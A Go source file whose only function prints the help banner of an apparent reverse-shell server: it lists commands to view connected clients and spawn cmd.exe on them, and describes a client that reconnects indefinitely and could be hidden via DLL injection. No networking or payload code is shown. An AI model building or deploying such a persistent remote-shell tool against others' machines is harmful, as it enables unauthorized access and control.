package main

import (
	"fmt"
)

func help() {
	fmt.Println("\033[1;37mServer commands:\033[0m")
	fmt.Println("\t\033[1;37ml\033[0m: List currently accepted connections (first field is connection IDs).")
	fmt.Println("\t\033[1;37m<Number>\033[0m: Spawn cmd.exe on client of specified connection ID.")
	fmt.Println("\t\033[1;37mh\033[0m: This help message.")
	fmt.Println("\t\033[1;37mq\033[0m: Quit server (clients won't quit).")
	fmt.Println("\t\033[1;37mCtrl-C\033[0m (When communicating with client): Close current client's connection.")
	fmt.Println("\033[1;37mClient behavior\033[0m:")
	fmt.Println("\tOnce client program starts, it will keep trying to connect ")
	fmt.Println("\tserver. Once it got accepted by the server, it waits server inform ")
	fmt.Println("\tto start cmd.exe. After cmd.exe exit or server disconnect (like server ")
	fmt.Println("\tpress Ctrl-C), \033[1;37mit will close the connection and cmd.exe, ")
	fmt.Println("\tthen try to connect server again (server will get a new connection ID).")
	fmt.Println("\t\033[0m So, \033[1;37m**the client runs forever if nothing bad happended ")
	fmt.Println("\teven after quitting server.**\033[0m")
	fmt.Println("(\033[1;37mNote\033[0m: This client spawns a cmd.exe process, so even using techniques like")
	fmt.Println("DLL injection to hide the client program itself, \033[1;31mcmd.exe will still appear in ")
	fmt.Println("task manager\033[0m.)")
}